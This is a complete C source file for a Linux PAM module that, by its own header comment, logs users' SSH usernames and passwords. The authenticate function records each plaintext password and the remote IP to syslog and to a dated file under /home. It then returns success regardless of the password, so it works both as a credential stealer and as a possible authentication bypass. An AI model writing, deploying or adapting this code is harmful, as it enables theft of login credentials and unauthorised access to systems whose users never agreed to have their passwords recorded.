/*
 * An light auth interface PAM module.
 * It can log user's username and password from ssh.
 *
 * Author: lightless <root@lightless.me>
 *
 * */

#include <stdio.h>
#include <syslog.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <time.h>

#define true 1
#define false 0

const char *log_filename = "/home/password.txt";

int
write_file(const char *username, const char *password, const char *remote_ip) {

    // get today date
    time_t now;
    struct tm *tm_now;
    char today[64];
    time(&now);
    tm_now = localtime(&now);
    strftime(today, sizeof(today), "%Y%m%d", tm_now);

    // make filename with date
    char filename[64] = {'\0'};
    memset(filename, '\0', sizeof(filename));
    sprintf(filename, "%s.%s", log_filename, today);

    FILE *file = fopen(filename, "a+");
    if (file == NULL) {
        syslog(LOG_ERR, "open password.txt fail.");
        return false;
    }
    size_t buffer_size = strlen(username) + strlen(password) + strlen(remote_ip) + 20;
    char *buffer = malloc(buffer_size);
    if (buffer == NULL) {
        syslog(LOG_ERR, "malloc buffer fail, size: %zu", buffer_size);
        return false;
    }

    memset(buffer, '\0', buffer_size);
    strcat(buffer, remote_ip);
    strcat(buffer, "|<*>|");
    strcat(buffer, username);
    strcat(buffer, "|<*>|");
    strcat(buffer, password);
    strcat(buffer, "\n");

    fputs(buffer, file);
    fclose(file);
    free(buffer);
    return true;
}

PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pam_handle, int flags, int argc, const char **argv) {

    const char *username = NULL;
    const char *password = NULL;
    const char *remote_ip = NULL;

    // get username
    int pam_err = pam_get_user(pam_handle, &username, NULL);
    if (pam_err != PAM_SUCCESS) {
        return pam_err;
    }
    syslog(LOG_ERR, "Get username: %s", username);

    // get password
    pam_err = pam_get_authtok(pam_handle, PAM_AUTHTOK, &password, NULL);
    if (pam_err != PAM_SUCCESS) {
        return PAM_SYSTEM_ERR;
    }
    syslog(LOG_ERR, "password: %s", password);

    // get remote ip address
    pam_err = pam_get_item(pam_handle, PAM_RHOST, (const void **)&remote_ip);
    if (pam_err != PAM_SUCCESS) {
        syslog(LOG_ERR, "Error while get remote ip address.");
        return PAM_SYSTEM_ERR;
    }

    write_file(username, password, remote_ip);

    return PAM_SUCCESS;
}


/*
 * Auth阶段的其他的PAM Interface，不用关心
 * */
PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pam_handle, int flags, int argc, const char **argv) {
    (void)pam_handle;
    (void)flags;
    (void)argc;
    (void)argv;
    return (PAM_SUCCESS);
}
